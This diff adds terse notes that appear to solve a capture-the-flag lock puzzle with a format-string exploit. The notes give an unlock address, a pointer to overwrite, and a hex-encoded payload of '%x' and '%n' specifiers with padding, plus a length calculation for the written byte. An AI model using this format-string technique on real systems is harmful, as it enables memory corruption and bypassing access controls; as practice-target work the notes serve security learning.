@@ -1,0 +1,12 @@
+unlock 44da
+
+add_to_overrride 3058
+
+             | Pointer to overrride
+             |
+"2578" * 6 + "adde" + "2578" + "256e" + "42" * 186
+#305c
+
+19 = hex(len("2578" * 6 + "ADDE" + "2578" + "256e" + "42") /2)
+
+Lenght to control byte written
